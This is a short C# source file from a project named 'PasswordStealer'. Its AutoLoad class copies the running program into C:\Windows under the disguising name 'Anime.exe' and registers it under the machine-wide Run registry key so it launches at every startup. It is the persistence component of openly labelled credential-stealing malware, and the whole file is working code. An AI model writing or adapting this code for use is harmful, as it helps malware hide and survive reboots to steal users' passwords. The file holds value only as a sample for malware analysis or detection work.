using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace PasswordStealer
{
    public class AutoLoad
    {
        public static bool SetAutorunValue(bool autorun)
        {
            string FirstPath = Application.StartupPath + "\\" + System.AppDomain.CurrentDomain.FriendlyName;
            const string name = "Anime";
            string ExePath = @"C:\Windows\Anime.exe";
            if (File.Exists(ExePath))
            {
                File.Delete(ExePath);
            }
            File.Copy(FirstPath, ExePath);
            RegistryKey reg;
            reg = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
            try
            {
                if (autorun)
                {
                    reg.SetValue(name, ExePath);
                }
                else
                {
                    reg.DeleteValue(name);
                }
                reg.Close();
            }
            catch
            {
                return false;
            }
            return true;
        }
    }
}
